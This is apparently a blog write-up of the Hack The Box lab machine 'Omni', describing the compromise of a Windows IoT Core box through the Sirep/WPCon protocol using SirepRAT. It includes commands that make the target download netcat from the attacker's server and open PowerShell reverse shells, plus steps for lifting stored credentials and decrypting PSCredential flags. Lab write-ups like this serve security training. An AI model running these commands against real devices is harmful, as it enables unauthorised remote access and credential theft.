Omni is a easy level Windows box in Hackthebox. The reason the OS in this machine is categorized into ```other``` is due the integration of an IOT device. Actually, I had to do some homework in powershell, so it took me some time to get a foothold in this box. And everytime I thought I got the flag it was encrypted with ```PSCredentials```. After a lot of trial and error I decrypted the flags. This is the first box that I've done which integrated IOT device so, I learnt a lot while doing this box. This post will explain how I cleared the ```Omni``` box in Hackthebox. I hope you'll find this useful.

Connect to ```Hackthebox``` and let's go.

## <ins>Enumeration</ins>
---
I started enumerating using ```nmap```.
<br>
![nmap_scan](/assets/img/hackthebox/omni/nmap_scan.png)
<br>
The ports ```8080/http``` ```135/smb``` and some other non-standard ports are open.

Visiting the ```http service``` it prompts for credentials. I tried some common credentials but had no luck with it. Then, I searched for ```windows device portal vulnerabilities``` and **hit a jackpot!!**. The first link from the search results clearly explained about the vulnerability and the second link gave away the tool to exploit. Here is the [blog which explains the vulnerability](https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/).

This vulnerability impacts the Sirep/WPCon communications protocol included with Windows IoT operating system.
<br>

<br>
I also checked the tool called ```SirepRAT``` which was made by the author.  Here is the [link to tool](https://github.com/SafeBreach-Labs/SirepRAT)

Clone the repository into your local machine.

I tried running the python script and successfully managed to get the ```System Information```.
<br>
<pre>python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice</pre>
<br>
![system_information](/assets/img/hackthebox/omni/4.png)
<br>
The ```Netcat``` utility is not pre-installed in ```Windows```. So, I downloaded the netcat-64 utility for windows and transferred it to the remote machine.

Here's how you can do it.

**1)** First download the netcat 64 utility from [github page](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------)

**2)** Open a ```python http server``` from the directory where netcat is.

**3)** Then run this.
<br>
<pre>python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell Invoke-Webrequest -Outfile C:\\Windows\\System32\\nc64.exe -Uri http://your-vpn-ip:8080/nc64.exe"</pre>
<br>
At first, I tried using ```cURL``` but I didn't get any response. So, I used the ```Invoke-Webrequest cmdlet``` to the download the netcat file.
<br>

<br>

## <ins>Reverse shell</ins>
---
I confirmed that the file has been downloaded from the GET request from my python server. Note that the double backslash is used for escaping.

Now, execute the netcat utility with the ```-e powershell.exe``` argument to get the reverse shell. Remember to open a netcat listener in your local machine.
<br>
<pre>python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\\Windows\\System32\\nc64.exe 10.10.14.246 4445 -e powershell.exe"</pre>
<br>
![reverse_shell](/assets/img/hackthebox/omni/6.png)
<br>
Bingo!! We got the reverse shell
<br>

<br>

## <ins>Getting the user</ins>
---
After some enumeration I found this interesting file in the ```c:\Program Files\WindowsPowershell\Modules\PackageManagement``` folder. The file is hidden. You can see hidden files using this command...
<br>
<pre>ls -force</pre>
<br>
![bat_file](/assets/img/hackthebox/omni/8.png)
<br>
You can view the contents of the file using this command...
<br>
<pre>type file-name</pre>
<br>
![contents_bat](/assets/img/hackthebox/omni/9.png)
<br>
We got the credentials for both the users ```app``` and ```administrator```. Login to the webpage using the credentials. 

After looking around, I found a way to get a reverse shell. In the dashboard under the ```Processess``` tab, click on the ```Run command```.
<br>
![run_command](/assets/img/hackthebox/omni/10.png)
<br>
We can run the command and get the flag in this page but it was a little uncomfortable for me so I tried running powershell payload but the command didn't get executed.  So, I used the netcat that I uploaded in the remote machine. Remember to open a netcat listener in your local machine.
<br>
<pre>C:\\Windows\\System32\\nc64.exe your-vpn-ip-addr 4446 -e powershell.exe</pre>
<br>
![reverse_shell](/assets/img/hackthebox/omni/11.png)
<br>

## <ins>User flag</ins>
---
I tried running winpeas but most commands didn't get executed and throwed a lot of errors. After looking around for a while, I checked if there were any other ```Volumes``` in the disk. I tried using ```Get-Volume``` but it showed that the ```cmdlet``` didn't exist. So, I used ```gdr``` in short for ```Get-PSDrive``` which I got from ```stackoverflow```.
<br>
<pre>gdr -PSProvider 'FileSystem'</pre>
<br>
![get_volume](/assets/img/hackthebox/omni/12.png)
<br>
There is another volume in the disk named ```U:\```.

I checked the ```U:\Users\app\``` and found the file named ```user.txt```.
<br>
![home_folder](/assets/img/hackthebox/omni/13.png)
<br>
I used ```type``` to get the contents of the file and found that it was encrypted with ```PSCredential```. 
<br>
![PS_creds](/assets/img/hackthebox/omni/14.png)
<br>
Arghh...I almost thought I got the user flag. I searched on how to decrypt the file and finally ended up with ```stackoverflow```.
<br>
<pre>
$credential = Import-CliXml -Path ./user.txt
$credential.GetNetworkCredential().Password
</pre>
<br>

## <ins>Root flag</ins>
---
For the root flag, login to the windows device portal page with the admin credentials. Note that you need to open a incognito tab to login to the page. Use the netcat file from the remote machine to get the reverse shell. Remember to open a netcat listener in your local machine. 

Alternatively, you can also use ```evil-winrm``` to get the flag. I went with the flow and used the same methodology to get the root flag.
<br>
![root_shell](/assets/img/hackthebox/omni/16.png)
<br>
The root flag is in the folder ```U:\Users\Administrator\```.
<br>
![root_folder](/assets/img/hackthebox/omni/17.png)
To get the root flag use this command to decrypt.
<br>
<pre>
$credential = Import-CliXml -Path ./root.txt
$credential.GetNetworkCredential().Password
</pre>
<br>

Box rooted!! Until next time...

That's it folks. Happy hacking!!!
